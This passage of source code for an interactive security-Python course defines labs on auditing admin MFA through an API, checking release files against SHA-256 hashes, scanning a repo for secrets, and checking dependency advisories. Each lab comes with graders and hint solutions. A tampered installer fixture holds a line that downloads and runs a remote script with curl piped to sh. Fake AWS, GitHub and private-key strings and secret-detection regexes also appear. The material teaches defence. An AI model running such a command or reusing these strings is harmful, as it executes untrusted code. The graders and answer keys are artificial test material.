          'admins_without_mfa = []\nfor user in all_users():\n    if user["role"] == "admin":\n        detail = get_json("/users/" + user["name"])\n        if not detail["mfa"]:\n            admins_without_mfa.append(user["name"])\nadmins_without_mfa.sort()'],
        check: API_CHECK + py`
          def check(ns, out, run, src):
              r = H.expect(ns, "admins_without_mfa", ["carol", "grace", "svc-ci"], list)
              if r is not True:
                  got = ns.get("admins_without_mfa")
                  if isinstance(got, list) and "frank" in got:
                      return "frank has no MFA, but he's a developer, not an admin. Only check users whose role is admin."
                  return r
              def change(users):
                  for u in users:
                      if u["name"] == "carol":
                          u["mfa"] = True
                  users.append({"name": "ivan", "role": "admin", "mfa": False, "last_login": "2026-11-03"})
              n, o, e = with_users(change, run)
              if n.get("admins_without_mfa") != ["grace", "ivan", "svc-ci"]:
                  return "When carol turned on MFA and a new admin ivan appeared without it, admins_without_mfa came out as " + H.short(n.get("admins_without_mfa")) + ". Get the answer from the API."
              return True
        `
      },
      {
        id: "tickets",
        text: "For each name in <code>admins_without_mfa</code>, POST to <code>/tickets</code> with JSON <code>{\"title\": \"Enable MFA for carol\", \"user\": \"carol\"}</code> (with <code>HEADERS</code> and <code>timeout=5</code>) and print <code>SEC-101 opened for carol</code> using the id the API returns.",
        hints: ["r = requests.post(BASE + \"/tickets\", json={...}, headers=HEADERS, timeout=5). r.raise_for_status(), then r.json()[\"id\"] is the ticket id.",
          'for name in admins_without_mfa:\n    r = requests.post(BASE + "/tickets", json={"title": f"Enable MFA for {name}", "user": name}, headers=HEADERS, timeout=5)\n    r.raise_for_status()\n    print(f"{r.json()[\'id\']} opened for {name}")'],
        check: API_CHECK + py`
          def check(ns, out, run, src):
              req = api()
              del req.calls[:]
              n, o, e = run()
              posts = [c for c in req.calls if c["method"] == "POST"]
              if not posts:
                  return "No POST requests were sent. Use requests.post(BASE + \"/tickets\", json=..., headers=HEADERS, timeout=5)."
              bodies = [c["json"] for c in posts]
              want = [{"title": "Enable MFA for " + x, "user": x} for x in ["carol", "grace", "svc-ci"]]
              if bodies != want:
                  return "The tickets you sent had these bodies:\n  " + H.short(bodies, 200) + "\nexpected:\n  " + H.short(want, 200)
              if any(not c["headers"].get("Authorization") for c in posts):
                  return "Send HEADERS with the POST too, or the API answers 401."
              if any(c["timeout"] is None for c in posts):
                  return "Pass timeout=5 to requests.post as well."
              want_out = ["SEC-101 opened for carol", "SEC-102 opened for grace", "SEC-103 opened for svc-ci"]
              got = [l for l in H.lines(o) if "opened for" in l]
              if got != want_out:
                  return "Expected:\n  " + "\n  ".join(want_out) + "\nYou printed:\n  " + ("\n  ".join(got) if got else "(no 'opened for' lines)") + "\nUse the id from the response JSON."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed: three tickets opened in seconds. One of them is <code>svc-ci</code>, a <b>service account</b> with admin rights and no MFA. Service accounts can't do MFA, so the real fix is to give it only the permissions CI needs and use short-lived tokens instead of a password.</p>" +
      "<p><b>Why this matters:</b> almost every security tool (scanners, cloud providers, GitHub, ticketing) has a REST API. <code>get → check → act</code> is how you automate security reviews.</p>",
    realworld: "The real requests library works exactly like this: pip install requests. GitHub's API, for example, is https://api.github.com with a Bearer token, and paginates with a Link header. Never hard-code a real token like TOKEN above: PY-124 shows how to read it from an environment variable.",
    quiz: [
      { q: "<code>requests.get(url)</code> gets a <code>404</code>. What happens if you don't call <code>raise_for_status()</code>?", options: ["requests raises an exception anyway", "Nothing: you get a Response with status_code 404 and your code carries on", "Python crashes", "It retries"], answer: 1,
        why: "requests only raises for network failures. HTTP errors are normal responses until you call raise_for_status()." },
      { q: "Why always pass <code>timeout=</code>?", options: ["It makes requests faster", "Without it, a server that never answers can hang your script forever", "The server requires it", "It retries failed requests"], answer: 1,
        why: "The default is no timeout at all. In CI a hung request means a stuck pipeline." },
      { q: "The API answers <code>401</code>. What's most likely wrong?", options: ["The URL has a typo", "The token is missing or invalid", "The server is down", "You used POST instead of GET"], answer: 1,
        why: "401 Unauthorized means the server doesn't know who you are: check the Authorization header." }
    ]
  });

  /* ================================================================== PY-120 */
  var RELEASE = {
    "release/agent": lines("#!/bin/sh", "# kestrel-agent 2.4.1 launcher", 'exec /opt/kestrel/bin/agent --config /etc/kestrel/agent.conf "$@"'),
    "release/agent.conf": lines("server = https://telemetry.kestrel.io", "interval = 60", "log_level = info"),
    // Tampered: the curl line wasn't in the file the manifest was made from.
    "release/install.sh": lines("#!/bin/sh", "set -e", "cp agent /usr/local/bin/kestrel-agent", "cp agent.conf /etc/kestrel/agent.conf",
      "curl -s http://198.51.100.66/x.sh | sh", 'echo "kestrel-agent installed"'),
    "release/SHA256SUMS": lines(
      "ef262ef03c948a8ce28be7a50eacf96bd23314f192204154ec321df6693b6fac  agent",
      "c332301739c587dc06768bf9e043826e3981929e7fb38ffad21ab653de62e829  agent.conf",
      "9cb011d6b026870c0e69bae0da8a06ae190930b3d365f061e1f43680795ba3d6  install.sh",
      "4e604ecf8edef8a2bdfae0cc86b897d7e225c530ab129e54c12c8d97ce9623fc  uninstall.sh")
  };

  var WITH_CHANGED = py`
    def with_changed(run, path, text, mode="w"):
        orig = open(path, newline="").read()
        try:
            with open(path, mode, newline="") as fh:
                fh.write(text)
            return run()
        finally:
            with open(path, "w", newline="") as fh:
                fh.write(orig)
  ` + "\n\n";

  LABS.push({
    id: "py-120", n: 20, module: 3, ticket: "PY-120", xp: 100,
    title: "Did someone change the installer?",
    topic: "Hashing & file integrity with hashlib",
    from: "Maya Chen · SRE lead",
    story: "<p>The <code>kestrel-agent</code> release we install on every server comes with a <code>SHA256SUMS</code> file: the fingerprint of each file at the moment it was built. Something in last night's copy on the download server looks off.</p>" +
      "<p>Hash every file in <code>release/</code>, compare against the manifest, and tell me exactly what changed.</p>",
    learn:
      '<div class="callout"><b>Files in this lab:</b> <code>release/agent</code>, <code>release/agent.conf</code>, <code>release/install.sh</code> and the manifest <code>release/SHA256SUMS</code>.</div>' +
      "<h3>What a hash is</h3><p>A hash function turns any amount of data into a short, fixed-length fingerprint. A good one like <b>SHA-256</b> has three properties that make it useful for security:</p>" +
      "<ul><li><b>Same input, same hash</b>, on every computer, forever.</li><li><b>Any change, completely different hash</b>, even one capital letter.</li><li><b>One-way:</b> you can't get the data back from the hash, or find other data with the same hash.</li></ul>" +
      ex('import hashlib\n\nprint(hashlib.sha256(b"kestrel").hexdigest())\nprint(hashlib.sha256(b"Kestrel").hexdigest())\nprint(len(hashlib.sha256(b"a whole novel could go here").hexdigest()))') +
      "<h3>Bytes, not text</h3><p>Hashes work on <b>bytes</b>. <code>b\"...\"</code> is a bytes literal; a normal string needs <code>.encode()</code> first (UTF-8 by default).</p>" +
      ex('import hashlib\n\nname = "kestrel"\ndata = name.encode()\nprint(type(name), type(data), data)\nprint(hashlib.sha256(data).hexdigest())') +
      "<h3>Hashing a file</h3><p>Open it in <b>binary mode</b> <code>\"rb\"</code>, so you get the exact bytes (no newline translation, no decoding errors on binaries), and feed it in chunks so a 4 GB disk image doesn't have to fit in memory. <code>update()</code> adds more data to the same hash.</p>" +
      ex('import hashlib\n\nh = hashlib.sha256()\nwith open("release/agent", "rb") as f:\n    while True:\n        chunk = f.read(65536)\n        if not chunk:\n            break\n        h.update(chunk)\nprint(h.hexdigest())') +
      "<h3>The manifest format</h3><p><code>SHA256SUMS</code> is what the Linux command <code>sha256sum *</code> writes: a hash, two spaces, a file name. <code>line.split()</code> splits it into the two parts.</p>" +
      ex('print(open("release/SHA256SUMS").read())') +
      '<div class="callout warn"><b>Which algorithm?</b> MD5 and SHA-1 are broken: attackers can make two different files with the same hash. Use SHA-256 (or SHA-512) for anything security-related. And hashes are not encryption, and on their own not safe for passwords; Module 4 covers password storage.</div>',
    starter: py`
      # PY-120 · Did someone change the installer?
      import hashlib
      from pathlib import Path


      def sha256_text(text):
          pass


      def sha256_file(path):
          pass


      # 3) manifest: {file name: expected hash} from release/SHA256SUMS


      # 4) changed and missing: sorted lists of file names


      # 5) Print the report

    `,
    files: RELEASE,
    removeFiles: ["release/uninstall.sh", "release/_bin.dat"],
    objectives: [
      {
        id: "text",
        text: "<code>sha256_text(text)</code> returns the SHA-256 hex digest (64 characters) of a string, encoded as UTF-8.",
        hints: ["Strings must become bytes first: text.encode(). Then hashlib.sha256(...).hexdigest().",
          "def sha256_text(text):\n    return hashlib.sha256(text.encode()).hexdigest()"],
        check: py`
          def check(ns, out, run, src):
              import hashlib
              f = H.fn(ns, "sha256_text")
              if not f:
                  return "I can't find a function called sha256_text."
              for text in ["kestrel", "Kestrel", "", "café ☕"]:
                  ok, got = H.call(f, text)
                  want = hashlib.sha256(text.encode()).hexdigest()
                  if not ok:
                      return "sha256_text(" + repr(text) + ") crashed: " + type(got).__name__ + ": " + str(got)
                  if isinstance(got, str) and len(got) == 32:
                      return "That's a 32-character hash, which is MD5. Use hashlib.sha256."
                  if not isinstance(got, str):
                      return "sha256_text should return the hex string. Call .hexdigest() on the hash."
                  if got != want:
                      return "sha256_text(" + repr(text) + ") returned " + got + ", expected " + want + "."
              return True
        `
      },
      {
        id: "file",
        text: "<code>sha256_file(path)</code> returns the SHA-256 hex digest of a file's bytes, opening it in binary mode <code>\"rb\"</code>.",
        hints: ["Make h = hashlib.sha256(), open the file with \"rb\", call h.update(chunk) for each chunk, and return h.hexdigest(). Reading it all at once with f.read() also works for small files.",
          'def sha256_file(path):\n    h = hashlib.sha256()\n    with open(path, "rb") as f:\n        while True:\n            chunk = f.read(65536)\n            if not chunk:\n                break\n            h.update(chunk)\n    return h.hexdigest()'],
        check: py`
          def check(ns, out, run, src):
              import hashlib, os
              f = H.fn(ns, "sha256_file")
              if not f:
                  return "I can't find a function called sha256_file."
              for path in ["release/agent", "release/install.sh"]:
                  ok, got = H.call(f, path)
                  want = hashlib.sha256(open(path, "rb").read()).hexdigest()
                  if not ok:
                      return "sha256_file(" + repr(path) + ") crashed: " + type(got).__name__ + ": " + str(got)
                  if got != want:
                      return "sha256_file(" + repr(path) + ") returned " + H.short(got) + ", expected " + want + "."
              data = bytes(range(256)) * 600
              with open("release/_bin.dat", "wb") as fh:
                  fh.write(data)
              ok, got = H.call(f, "release/_bin.dat")
              os.remove("release/_bin.dat")
              if not ok:
                  return "sha256_file crashed on a binary file (" + type(got).__name__ + "). Open files with \"rb\" so you read raw bytes."
              if got != hashlib.sha256(data).hexdigest():
                  return "For a 150 KB binary file, sha256_file gave the wrong hash. Make sure you hash every chunk, in binary mode."
              return True
        `
      },
      {
        id: "manifest",
        text: "<code>manifest</code> is a dict: file name → expected hash, read from <code>release/SHA256SUMS</code>.",
        hints: ["Loop over the lines of the file. line.split() gives [hash, name]; store manifest[name] = hash. Skip blank lines.",
          'manifest = {}\nwith open("release/SHA256SUMS") as f:\n    for line in f:\n        if line.strip():\n            digest, name = line.split()\n            manifest[name] = digest'],
        check: WITH_CHANGED + py`
          def check(ns, out, run, src):
              want = {}
              for line in open("release/SHA256SUMS"):
                  h, name = line.split()
                  want[name] = h
              r = H.expect(ns, "manifest", want, dict)
              if r is not True:
                  return r
              n, o, e = with_changed(run, "release/SHA256SUMS", "0" * 64 + "  README.md\n", "a")
              if (n.get("manifest") or {}).get("README.md") != "0" * 64:
                  return "When I added a README.md line to SHA256SUMS, manifest didn't include it. Read the file instead of typing the hashes."
              return True
        `
      },
      {
        id: "compare",
        text: "<code>changed</code> is the sorted list of manifest files that exist but whose hash doesn't match; <code>missing</code> is the sorted list of manifest files that don't exist in <code>release/</code>.",
        hints: ["For each name, digest in manifest.items(): path = Path(\"release\") / name. If not path.exists(), it's missing; elif sha256_file(path) != digest, it's changed.",
          'changed = []\nmissing = []\nfor name, digest in manifest.items():\n    path = Path("release") / name\n    if not path.exists():\n        missing.append(name)\n    elif sha256_file(path) != digest:\n        changed.append(name)\nchanged.sort()\nmissing.sort()'],
        check: WITH_CHANGED + py`
          def check(ns, out, run, src):
              r = H.expect(ns, "changed", ["install.sh"], list)
              if r is not True:
                  return r
              r = H.expect(ns, "missing", ["uninstall.sh"], list)
              if r is not True:
                  return r
              n, o, e = with_changed(run, "release/agent.conf", "log_level = debug\n", "a")
              if n.get("changed") != ["agent.conf", "install.sh"]:
                  return "When I edited release/agent.conf, changed came out as " + H.short(n.get("changed")) + ". Compare real hashes with the manifest."
              return True
        `
      },
      {
        id: "report",
        text: "Print one line per manifest entry, in manifest order: <code>f\"{status:8} {name}\"</code> where status is <code>OK</code>, <code>CHANGED</code> or <code>MISSING</code>. Then <code>1 changed, 1 missing</code>.",
        hints: ["Loop over manifest again and pick the status by checking if name is in missing or changed. :8 pads the status to 8 characters so the names line up.",
          'for name in manifest:\n    if name in missing:\n        status = "MISSING"\n    elif name in changed:\n        status = "CHANGED"\n    else:\n        status = "OK"\n    print(f"{status:8} {name}")\nprint(f"{len(changed)} changed, {len(missing)} missing")'],
        check: WITH_CHANGED + py`
          def check(ns, out, run, src):
              r = H.printed(out, ["OK       agent", "OK       agent.conf", "CHANGED  install.sh", "MISSING  uninstall.sh", "1 changed, 1 missing"])
              if r is not True:
                  return r
              n, o, e = with_changed(run, "release/agent", "# patched\n", "a")
              if "2 changed, 1 missing" not in H.lines(o):
                  return "When I changed release/agent too, the last line should say 2 changed, 1 missing. Build the report from changed and missing."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. <code>install.sh</code> gained one line: <code>curl -s http://198.51.100.66/x.sh | sh</code>, which downloads and runs a script from an unknown server as root on every machine that installs the agent. That's a <b>supply-chain attack</b>, and the hash check caught it before anyone ran it.</p>" +
      "<p>One catch: if the attacker can change the files, they may be able to change <code>SHA256SUMS</code> too. That's why real releases also <b>sign</b> the manifest (GPG, Sigstore/cosign) with a key the attacker doesn't have.</p>",
    realworld: "On Linux, sha256sum -c SHA256SUMS does this whole lab in one command. pip install --require-hashes checks package hashes, Git identifies every commit by a hash, and malware analysts share file hashes (e.g. on VirusTotal) to recognise known-bad files.",
    quiz: [
      { q: "Why open a file with <code>\"rb\"</code> before hashing it?", options: ["It's faster", "You hash the exact bytes on disk, with no decoding or newline changes", "Text mode can't read files", "SHA-256 only accepts binary files"], answer: 1,
        why: "Text mode decodes and may translate newlines, so the bytes you hash wouldn't match sha256sum's. Binary files may not even decode." },
      { q: "One character of a file changes. What happens to its SHA-256 hash?", options: ["One character of the hash changes", "Nothing", "It changes completely", "It gets longer"], answer: 2,
        why: "That's the point of a cryptographic hash: any change gives an unrelated-looking hash." },
      { q: "Which is safe to use for file integrity today?", options: ["MD5", "SHA-1", "SHA-256", "Any of them"], answer: 2,
        why: "MD5 and SHA-1 have practical collision attacks. Use SHA-256 or stronger." }
    ]
  });

  /* ================================================================== PY-121 */
  // Fake secrets are assembled here so this source file never contains a complete key-shaped string.
  var FAKE_AWS = "AKIA" + "IOSFODNN7EXAMPLE";
  var FAKE_GH = "gh" + "p_" + "Kc7dR2mQ9xLw4TzB8nHf3VjP6sYe1UaG5oNi";
  var PK_BEGIN = "-----BEGIN " + "OPENSSH PRIVATE KEY-----";
  var REPO = {
    "repo/README.md": lines("# release-bot", "", "Posts release notes to the team channel.", "",
      "Set GITHUB_TOKEN and the AWS keys as environment variables.", "AWS access key IDs look like AKIA followed by 16 characters (e.g. AKIA1234...)."),
    "repo/app.py": lines("import requests", "", 'GITHUB_TOKEN = "' + FAKE_GH + '"', "", "",
      "def latest_release(repo):", '    r = requests.get(f"https://api.github.com/repos/{repo}/releases/latest",',
      '                     headers={"Authorization": "Bearer " + GITHUB_TOKEN}, timeout=5)', '    return r.json()["tag_name"]'),
    "repo/config/settings.py": lines("DEBUG = False", 'AWS_REGION = "ap-southeast-2"', 'AWS_ACCESS_KEY_ID = "' + FAKE_AWS + '"',
      'DB_HOST = "db.internal"', 'DB_PASSWORD = "Winter2026!"'),
    "repo/deploy/id_ed25519": lines(PK_BEGIN, "ZmFrZSBrZXkgZm9yIGEgbGFiIC0gbm90IHJlYWw=", "-----END OPENSSH PRIVATE KEY-----"),
    "repo/tests/test_app.py": lines("import os", "", 'password = os.environ["TEST_DB_PASSWORD"]', "", "", "def test_password_is_set():", "    assert password")
  };

  LABS.push({
    id: "py-121", n: 21, module: 3, ticket: "PY-121", xp: 100,
    title: "Keys in the repo",
    topic: "Build a secrets scanner",
    from: "Dev Patel · Security",
    story: "<p>We're about to open-source <code>release-bot</code>, and I have a bad feeling about it. Once code is public, any key in it is found by bots <b>within minutes</b>.</p>" +
      "<p>Build a scanner that walks the whole repo and reports every hard-coded secret: which file, which line, what kind. And whatever you do, <b>don't print the secrets themselves</b>.</p>",
    learn:
      '<div class="callout"><b>Files in this lab:</b> a small repo in <code>repo/</code> with sub-folders <code>config/</code>, <code>deploy/</code> and <code>tests/</code>. The keys in it are fake, but they have the real formats.</div>' +
      "<h3>Secrets have shapes</h3><p>Many secrets have a recognisable format, which is exactly how scanners like GitHub secret scanning, gitleaks and TruffleHog find them:</p>" +
      '<table class="t"><tr><th>Secret</th><th>Shape</th><th>Regex</th></tr>' +
      "<tr><td>AWS access key ID</td><td><code>AKIA</code> + 16 capital letters/digits</td><td><code>AKIA[0-9A-Z]{16}</code></td></tr>" +
      "<tr><td>GitHub personal token</td><td><code>ghp_</code> + 36 letters/digits</td><td><code>ghp_[A-Za-z0-9]{36}</code></td></tr>" +
      "<tr><td>Private key file</td><td>a <code>-----BEGIN ... PRIVATE KEY-----</code> line</td><td><code>-----BEGIN [A-Z ]*PRIVATE KEY-----</code></td></tr>" +
      "<tr><td>Hard-coded password</td><td><code>password = \"...\"</code></td><td><code>(?i)password\\s*=\\s*[\"'][^\"']+[\"']</code></td></tr></table>" +
      "<p><code>{16}</code> means exactly 16 of the previous thing, and <code>(?i)</code> at the start makes the pattern case-insensitive.</p>" +
      ex('import re\n\naws = re.compile(r"AKIA[0-9A-Z]{16}")\nprint(aws.search("key = AKIA" + "ABCDEFGHIJKLMNOP"))\nprint(aws.search("see AKIA1234 in the docs"))') +
      "<h3>finditer: every match, with its text</h3><p><code>pattern.finditer(text)</code> yields a match object for each hit; <code>m.group()</code> is the matched text.</p>" +
      ex('import re\n\npw = re.compile(r"(?i)password\\s*=\\s*[\\"\'][^\\"\']+[\\"\']")\nfor m in pw.finditer(\'DB_PASSWORD = "x1"\\nadmin_password=\\\'y2\\\'\\npassword = os.environ["P"]\'):\n    print(m.group())') +
      "<p>The last line didn't match: reading a password from the environment is exactly what we <em>want</em> people to do.</p>" +
      "<h3>Walking a folder tree</h3><p><code>Path(root).rglob(\"*\")</code> is <code>glob</code> that also goes into every sub-folder. It yields folders too, so keep only <code>p.is_file()</code>. <code>p.as_posix()</code> gives the path with forward slashes.</p>" +
      ex('from pathlib import Path\n\nfor p in sorted(Path("repo").rglob("*")):\n    print(p.as_posix(), "(file)" if p.is_file() else "(folder)")') +
      "<p><code>enumerate(lines, start=1)</code> numbers lines from 1, the way editors do.</p>" +
      '<div class="callout warn"><b>Never print the secret.</b> Scanner output ends up in CI logs, chat and tickets. Report the file, line and type, and let a human open the file.</div>',
    starter: py`
      # PY-121 · Keys in the repo
      import re
      from pathlib import Path

      PATTERNS = {
          "AWS access key": re.compile(r""),        # 1) write this pattern
          "GitHub token": re.compile(r""),          # 1) and this one
          "Private key": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
          "Hard-coded password": re.compile(r"(?i)password\s*=\s*[\"'][^\"']+[\"']"),
      }


      def find_secrets(text):
          pass


      def scan_repo(root):
          pass


      # 4) Scan "repo" and print the report

    `,
    files: REPO,
    removeFiles: ["repo/scripts/backup.sh"],
    objectives: [
      {
        id: "patterns",
        text: "Fill in the <code>AWS access key</code> and <code>GitHub token</code> patterns in <code>PATTERNS</code>. They must match the real formats and nothing shorter.",
        hints: ["AWS: AKIA followed by exactly 16 characters from [0-9A-Z]. GitHub: ghp_ followed by exactly 36 characters from [A-Za-z0-9].",
          '"AWS access key": re.compile(r"AKIA[0-9A-Z]{16}"),\n"GitHub token": re.compile(r"ghp_[A-Za-z0-9]{36}"),'],
        check: py`
          def check(ns, out, run, src):
              P = ns.get("PATTERNS")
              if not isinstance(P, dict):
                  return "I can't find the PATTERNS dict."
              aws, gh = P.get("AWS access key"), P.get("GitHub token")
              if aws is None or gh is None or not hasattr(aws, "search") or not hasattr(gh, "search"):
                  return "PATTERNS needs compiled patterns under \"AWS access key\" and \"GitHub token\"."
              if not aws.pattern or not gh.pattern:
                  return "The AWS and GitHub patterns are still empty: r\"\" matches everything."
              good_aws = ["AKIA" + "Z9Y8X7W6V5U4T3S2", "id=AKIA" + "ABCDEFGHIJKLMNOP;"]
              bad_aws = ["AKIA1234", "akia" + "abcdefghijklmnop", "AKIA" + "abcdefghijklmnop", "AKIA" + "ABCDEFGHIJKLMNO"]
              good_gh = ["gh" + "p_" + "a1" * 18, "token: gh" + "p_" + "Zz9" * 12]
              bad_gh = ["gh" + "p_" + "a1" * 10, "gh" + "o_" + "a1" * 18, "ghp-" + "a1" * 18]
              for s in good_aws:
                  if not aws.search(s):
                      return "The AWS pattern should match " + repr(s) + " (AKIA + 16 capital letters/digits)."
              for s in bad_aws:
                  if aws.search(s):
                      return "The AWS pattern shouldn't match " + repr(s) + ". Require exactly 16 characters from [0-9A-Z] after AKIA."
              for s in good_gh:
                  if not gh.search(s):
                      return "The GitHub pattern should match " + repr(s) + " (ghp_ + 36 letters/digits)."
              for s in bad_gh:
                  if gh.search(s):
                      return "The GitHub pattern shouldn't match " + repr(s) + ". Require ghp_ and exactly 36 letters/digits."
              return True
        `
      },
      {
        id: "find",
        text: "<code>find_secrets(text)</code> returns a list of <code>(line_number, kind, matched_text)</code> for every match of every pattern, line by line (numbered from 1), and for each line in <code>PATTERNS</code> order.",
        hints: ["Loop for number, line in enumerate(text.splitlines(), start=1), then for kind, pattern in PATTERNS.items(), then for m in pattern.finditer(line): append (number, kind, m.group()).",
          "def find_secrets(text):\n    found = []\n    for number, line in enumerate(text.splitlines(), start=1):\n        for kind, pattern in PATTERNS.items():\n            for m in pattern.finditer(line):\n                found.append((number, kind, m.group()))\n    return found"],
        check: py`
          def check(ns, out, run, src):
              f = H.fn(ns, "find_secrets")
              if not f:
                  return "I can't find a function called find_secrets."
              k1 = "AKIA" + "QWERTYUIOPASDFGH"
              k2 = "AKIA" + "ZXCVBNMLKJHGFDSA"
              t = "gh" + "p_" + "x" * 36
              text = "# config\nKEY = '" + k1 + "'\nok = 1\nBOTH = '" + t + "' + '" + k2 + "' + '" + k1 + "'\npassword = 'hunter2'\n"
              ok, got = H.call(f, text)
              if not ok:
                  return "find_secrets crashed: " + type(got).__name__ + ": " + str(got)
              want = [(2, "AWS access key", k1), (4, "AWS access key", k2), (4, "AWS access key", k1), (4, "GitHub token", t),
                      (5, "Hard-coded password", "password = 'hunter2'")]
              if isinstance(got, list) and got and isinstance(got[0], tuple) and got[0][0] == 1:
                  return "Line numbers should start at 1 for the first line. Use enumerate(..., start=1), and check you aren't off by one."
              if got != want:
                  return "For a 5-line test text, find_secrets returned:\n  " + H.short(got, 300) + "\nexpected:\n  " + H.short(want, 300) + "\n(two keys on one line are two findings; use finditer)"
              ok, got = H.call(f, "nothing to see here\n")
              if not ok or got != []:
                  return "For text with no secrets, find_secrets should return an empty list."
              return True
        `
      },
      {
        id: "scan",
        text: "<code>scan_repo(root)</code> returns a list of <code>(path, line_number, kind)</code> for every file under <code>root</code> (all sub-folders), files in sorted order, where <code>path</code> is a string with forward slashes like <code>\"repo/app.py\"</code>.",
        hints: ["for p in sorted(Path(root).rglob(\"*\")): skip it unless p.is_file(). Read it with p.read_text(errors=\"ignore\"), call find_secrets, and append (p.as_posix(), number, kind) for each finding.",
          'def scan_repo(root):\n    results = []\n    for p in sorted(Path(root).rglob("*")):\n        if not p.is_file():\n            continue\n        for number, kind, _ in find_secrets(p.read_text(errors="ignore")):\n            results.append((p.as_posix(), number, kind))\n    return results'],
        check: py`
          def check(ns, out, run, src):
              import os
              f = H.fn(ns, "scan_repo")
              if not f:
                  return "I can't find a function called scan_repo."
              ok, got = H.call(f, "repo")
              if not ok:
                  return "scan_repo(\"repo\") crashed: " + type(got).__name__ + ": " + str(got)
              want = [("repo/app.py", 3, "GitHub token"), ("repo/config/settings.py", 3, "AWS access key"),
                      ("repo/config/settings.py", 5, "Hard-coded password"), ("repo/deploy/id_ed25519", 1, "Private key")]
              if isinstance(got, list) and any(isinstance(x, tuple) and len(x) == 3 and not isinstance(x[0], str) for x in got):
                  return "The path should be a string. Use p.as_posix()."
              if got != want:
                  missing = [w for w in want if w not in (got or [])]
                  extra = [g for g in (got or []) if g not in want]
                  msg = "scan_repo(\"repo\") isn't right."
                  if missing:
                      msg += "\nMissing: " + H.short(missing, 200)
                      if any("/" in w[0][5:] for w in missing):
                          msg += "\n(files in sub-folders: use rglob, not glob)"
                  if extra:
                      msg += "\nUnexpected: " + H.short(extra, 200)
                  if not missing and not extra:
                      msg += "\nThe order is off: loop over sorted(Path(root).rglob(\"*\"))."
                  return msg
              os.makedirs("repo/scripts", exist_ok=True)
              with open("repo/scripts/backup.sh", "w") as fh:
                  fh.write("#!/bin/sh\nexport AWS_ACCESS_KEY_ID=AKIA" + "MNBVCXZLKJHGFDSA\n")
              ok, got = H.call(f, "repo")
              os.remove("repo/scripts/backup.sh")
              if not ok or ("repo/scripts/backup.sh", 2, "AWS access key") not in got:
                  return "When I added repo/scripts/backup.sh with a key on line 2, scan_repo didn't report it. Walk the folder instead of listing files by hand."
              return True
        `
      },
      {
        id: "report",
        text: "Print one line per finding as <code>repo/app.py:3  GitHub token</code> (two spaces), then <code>4 secrets in 3 files</code>. Never print the secret values.",
        hints: ["findings = scan_repo(\"repo\"). Print f\"{path}:{line}  {kind}\" for each. The number of files is len({path for path, _, _ in findings}).",
          'findings = scan_repo("repo")\nfor path, line, kind in findings:\n    print(f"{path}:{line}  {kind}")\nfiles = {path for path, _, _ in findings}\nprint(f"{len(findings)} secrets in {len(files)} files")'],
        check: py`
          def check(ns, out, run, src):
              import os
              for secret in ["AKIA" + "IOSFODNN7EXAMPLE", "gh" + "p_Kc7dR2mQ9x", "Winter2026!"]:
                  if secret in out:
                      return "Your output contains a secret (" + secret[:6] + "...). Print only the file, line and kind: scanner output ends up in CI logs."
              want = ["repo/app.py:3  GitHub token", "repo/config/settings.py:3  AWS access key",
                      "repo/config/settings.py:5  Hard-coded password", "repo/deploy/id_ed25519:1  Private key", "4 secrets in 3 files"]
              r = H.printed(out, want)
              if r is not True:
                  return r
              os.makedirs("repo/scripts", exist_ok=True)
              with open("repo/scripts/backup.sh", "w") as fh:
                  fh.write("#!/bin/sh\nexport AWS_ACCESS_KEY_ID=AKIA" + "MNBVCXZLKJHGFDSA\n")
              try:
                  n, o, e = run()
              finally:
                  os.remove("repo/scripts/backup.sh")
              if "5 secrets in 4 files" not in H.lines(o):
                  return "With one more file containing a key, the last line should say 5 secrets in 4 files. Count from your findings."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed, and the repo stays private until it's clean. Deleting the lines isn't enough, though: the secrets are still in the <b>Git history</b>, so every one of them must be <b>revoked and rotated</b> (new key, old key disabled). Assume any secret that was ever committed is compromised.</p>" +
      "<p>Then move them where they belong: environment variables or a secrets manager. That's PY-124.</p>",
    realworld: "Run gitleaks or TruffleHog in CI and as a pre-commit hook, and turn on GitHub secret scanning with push protection: it blocks a push that contains a known key format. They work like your scanner, with hundreds of patterns plus entropy checks for random-looking strings.",
    quiz: [
      { q: "You find an AWS key committed 6 months ago, and delete it in a new commit. Is it safe now?", options: ["Yes, it's gone from the code", "No: it's still in Git history and may already be copied, so revoke and rotate it", "Yes, if the repo is private", "Only if nobody cloned the repo"], answer: 1,
        why: "Git keeps every version. Treat any committed secret as leaked." },
      { q: "Why doesn't the scanner print the matched secret?", options: ["It's too long", "Scanner output goes to CI logs and tickets, which would leak the secret again", "Python can't print it", "It's encrypted"], answer: 1,
        why: "Logs are widely readable and kept for a long time. Report the location, not the value." },
      { q: "What does <code>rglob(\"*\")</code> do that <code>glob(\"*\")</code> doesn't?", options: ["Sorts the results", "Also looks inside every sub-folder", "Only returns files", "Reads the files"], answer: 1,
        why: "The r is for recursive." }
    ]
  });

  /* ================================================================== PY-122 */
  var REQUIREMENTS = lines("# release-bot dependencies", "Django==4.2.10", "requests==2.31.0", "PyYAML==6.0.1", "", "jinja2==3.1.4    # templates",
    "urllib3==2.2.2", "cryptography==42.0.0", "flask");
  var ADVISORIES = [
    { id: "KSA-2026-0031", "package": "django", fixed_in: "4.2.16", severity: "high", summary: "SQL injection in QuerySet.values() on PostgreSQL" },
    { id: "KSA-2026-0044", "package": "requests", fixed_in: "2.32.0", severity: "medium", summary: "verify=False stays on for later requests in a Session" },
    { id: "KSA-2026-0058", "package": "jinja2", fixed_in: "3.1.5", severity: "medium", summary: "Sandbox escape through str.format" },
    { id: "KSA-2026-0072", "package": "urllib3", fixed_in: "2.2.2", severity: "medium", summary: "Proxy-Authorization header kept on cross-origin redirect" },
    { id: "KSA-2026-0107", "package": "cryptography", fixed_in: "42.0.4", severity: "critical", summary: "Crash when loading a malformed PKCS#12 file" },
    { id: "KSA-2026-0113", "package": "django", fixed_in: "4.2.9", severity: "low", summary: "Denial of service in intcomma template filter" }
  ];

  LABS.push({
    id: "py-122", n: 22, module: 3, ticket: "PY-122", xp: 100,
    title: "Are we running vulnerable packages?",
    topic: "Dependency check: versions & advisories",
    from: "Dev Patel · Security",
    story: "<p><code>release-bot</code> has seven dependencies, and each of those has its own security advisories. Most breaches through dependencies use bugs that were <b>already fixed</b>; the victim just hadn't upgraded.</p>" +
      "<p>Our advisory feed is in <code>advisories.json</code>. Check <code>requirements.txt</code> against it and tell me what to upgrade, worst first.</p>",
    learn:
